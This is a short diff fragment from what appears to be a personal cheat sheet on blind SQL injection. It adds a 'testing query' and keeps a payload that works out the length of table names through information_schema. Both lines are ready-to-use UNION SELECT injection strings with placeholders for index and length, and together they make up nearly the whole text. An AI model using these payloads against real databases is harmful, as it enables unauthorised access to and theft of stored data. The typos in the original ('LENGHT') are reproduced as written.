@@ -1,3 +1,7 @@
+*** Testing Query ****
+  ' UNION SELECT 1, #, #... WHERE ascii(SUBSTRING('A', 1, 1)) = 65-- -
+
+
 - Dumping the LENGHT of a table name:
 ' UNION SELECT 1 WHERE (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1) = {LENGHT}-- -
 
